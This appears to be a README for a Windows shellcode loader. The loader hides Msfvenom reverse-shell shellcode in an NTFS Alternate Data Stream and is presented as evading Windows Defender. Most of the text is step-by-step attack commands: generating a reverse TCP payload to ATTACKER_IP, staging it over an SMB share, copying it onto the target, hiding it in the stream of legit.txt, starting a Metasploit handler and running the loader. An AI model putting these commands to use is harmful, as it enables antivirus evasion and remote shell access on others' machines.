# Shellcode-Loader-with-ADS
A simple shellcode loader that use Alternate Data Streams to store the shellcode, it evades Windows Defender (December 2025).  
It can load a reverse shell shellcode generated by Msfvenom without being detected but **use it with a Meterpreter will be flagged.**

Full details on how it works here : https://medium.com/@thomsoe/bypassing-windows-defender-during-christmas-2025-shellcode-loader-with-alternate-data-stream-be8a0b36bd72

# How to compile 
1. For Windows - Download [WinLibs](https://winlibs.com/) and extract the binaries
2. `gcc loader-ads.c -o loader-ads`

# How to use
1. Generate a reverse shell shellcode on your kali : 
   - `msfvenom --platform windows -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f raw -o payload.bin`
2. Start an smbserver :
   - `smbserver.py share . -smb2support -u test -password test`
3. On your Windows target, transfer the file :
   - `net use \\<ATTACKER_IP>\share /user:test test`
   - `copy \\<ATTACKER_IP>\share\payload.bin .`
4. Create a new text file and put the shellcode inside its Alternate Data Stream :
   - `echo "AAAAAAAAA" > legit.txt`
   - `type payload.bin > legit.txt:payload.bin`
5. Start your metasploit listener :
   - `msfconsole -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>;exploit"`
7. Start the loader with the ADS path :
   - `.\loader-ads.exe legit.txt:payload.bin`   


